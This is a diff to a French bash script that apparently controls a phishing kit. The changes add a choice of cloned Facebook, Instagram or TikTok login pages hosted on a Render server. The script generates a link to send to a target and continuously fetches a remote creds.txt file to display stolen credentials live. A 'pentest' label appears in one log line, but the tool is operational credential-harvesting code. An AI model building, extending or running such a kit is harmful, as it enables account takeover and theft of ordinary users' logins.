@@ -17,14 +17,14 @@ NC='\033[0m'
 CREDIT_FILE="credit.text"
 HELP_FILE="help.text"
 
-# URL Render — base sans index.php
+# URL Render
 APP_URL="https://leofish-tool-v1-0.onrender.com"
 
 # Créer dossier sessions
 mkdir -p sessions
 
 # ══════════════════════════════════════════
-# BANNIÈRE + LOGO
+# BANNIÈRE
 # ══════════════════════════════════════════
 show_banner() {
     clear
@@ -41,12 +41,40 @@ show_banner() {
 }
 
 # ══════════════════════════════════════════
-# GÉNÉRER LIEN + MONITORING
+# GÉNÉRER LIEN + MONITORING (AVEC SÉLECTION)
 # ══════════════════════════════════════════
 generate_campaign() {
     show_banner
     echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH${NC}"
     echo ""
+    
+    # Sélection de la plateforme
+    echo -e "${WHITE}Choisissez la plateforme à cloner :${NC}"
+    echo -e "  ${GREEN}a${NC}  Facebook"
+    echo -e "  ${GREEN}b${NC}  Instagram"
+    echo -e "  ${GREEN}c${NC}  TikTok"
+    echo ""
+    read -rp "$(echo -e "${WHITE}Votre choix (a/b/c) : ${NC}")" platform_choice
+
+    case $platform_choice in
+        a|A)
+            PLATFORM="facebook"
+            PAGE="index.php"
+            ;;
+        b|B)
+            PLATFORM="instagram"
+            PAGE="instagramlogin.php"
+            ;;
+        c|C)
+            PLATFORM="tiktok"
+            PAGE="tiktoklogin.php"
+            ;;
+        *)
+            echo -e "${RED}❌ Choix invalide. Retour au menu.${NC}"
+            sleep 2
+            return
+            ;;
+    esac
 
     # Ping Render pour le réveiller
     echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
@@ -61,16 +89,16 @@ generate_campaign() {
     # ID unique de session
     SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)
 
-    # Lien vers index.php
-    PHISH_LINK="${APP_URL}/index.php?session=${SESSION_ID}"
+    # Lien spécifique selon la plateforme
+    PHISH_LINK="${APP_URL}/${PAGE}?session=${SESSION_ID}"
 
-    # Log local de cette session
-    SESSION_LOG="sessions/${SESSION_ID}.log"
-    echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOG"
+    # Log local
+    SESSION_LOG="sessions/${SESSION_ID}_${PLATFORM}.log"
+    echo "=== SESSION PENTEST $(date) - Plateforme: $PLATFORM ===" > "$SESSION_LOG"
     echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"
 
     echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ — ENVOIE À LA CIBLE :                              ${GREEN}║${NC}"
+    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ ($PLATFORM) — ENVOIE À LA CIBLE :                ${GREEN}║${NC}"
     echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
     echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
@@ -80,31 +108,31 @@ generate_campaign() {
     echo ""
     read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"
 
-    monitor_logs "$SESSION_ID" "$SESSION_LOG"
+    monitor_logs "$SESSION_ID" "$SESSION_LOG" "$PLATFORM"
 }
 
 # ══════════════════════════════════════════
-# MONITORING — FETCH creds.txt DEPUIS RENDER
+# MONITORING
 # ══════════════════════════════════════════
 monitor_logs() {
     local session_id=$1
     local session_log=$2
+    local platform=$3
     local last_content=""
 
     show_banner
-    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
+    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
     echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
     echo -e "${BLUE}📡 Lecture des logs depuis : ${WHITE}${APP_URL}/creds.txt${NC}"
     echo ""
 
     while true; do
-        # Fetch creds.txt depuis le serveur Render
         current=$(curl -s --max-time 10 "${APP_URL}/creds.txt")
 
         if [ -n "$current" ] && [ "$current" != "$last_content" ]; then
             clear
             show_banner
-            echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
+            echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
             echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
             echo ""
 
@@ -125,7 +153,7 @@ monitor_logs() {
 }
 
 # ══════════════════════════════════════════
-# VOIR LES SESSIONS ENREGISTRÉES
+# VOIR LES SESSIONS (simplifié pour la lecture)
 # ══════════════════════════════════════════
 show_sessions() {
     show_banner
@@ -154,7 +182,7 @@ show_sessions() {
 }
 
 # ══════════════════════════════════════════
-# AIDE (lit help.text)
+# AIDE
 # ══════════════════════════════════════════
 show_help() {
     show_banner
